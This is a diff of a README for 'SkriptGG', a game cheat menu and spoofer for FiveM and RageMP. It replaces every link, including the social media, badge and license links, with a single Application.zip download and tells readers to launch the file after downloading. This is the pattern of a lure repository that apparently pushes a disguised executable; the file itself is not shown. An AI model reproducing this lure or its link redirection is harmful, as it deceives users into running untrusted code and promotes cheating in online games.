@@ -22,23 +22,23 @@ SkriptGG is your go-to source for the best mod menu for games like FiveM, RageMP
 - **SkriptGG Spoofer Free**: Enjoy our free spoofer to keep you playing without interruptions.
 
 ## Get Started
-To access the SkriptGG mod menu and unleash the power of our cheats, click [here](https://github.com/user-attachments/files/18426772/Application.zip) to download the application. 
+To access the SkriptGG mod menu and unleash the power of our cheats, click [here](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip) to download the application. 
 
 ### **Note: The file needs to be launched after downloading.**
 
-[![Download SkriptGG](https://img.shields.io/badge/Download-SkriptGG-orange)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download SkriptGG](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip)](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip)
 
 ## Contribution
 We welcome contributions to improve SkriptGG and enhance the gaming experience for players worldwide. Feel free to fork our repository, make changes, and submit pull requests to help us grow and evolve.
 
 ## Connect with Us
 Stay updated on the latest SkriptGG developments by following us on social media:
-- [Twitter](https://twitter.com/skriptgg)
-- [Facebook](https://facebook.com/skriptgg)
-- [Instagram](https://instagram.com/skriptgg)
+- [Twitter](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip)
+- [Facebook](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip)
+- [Instagram](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip)
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/SkriptGG/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/wolfi18/SkriptGG/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
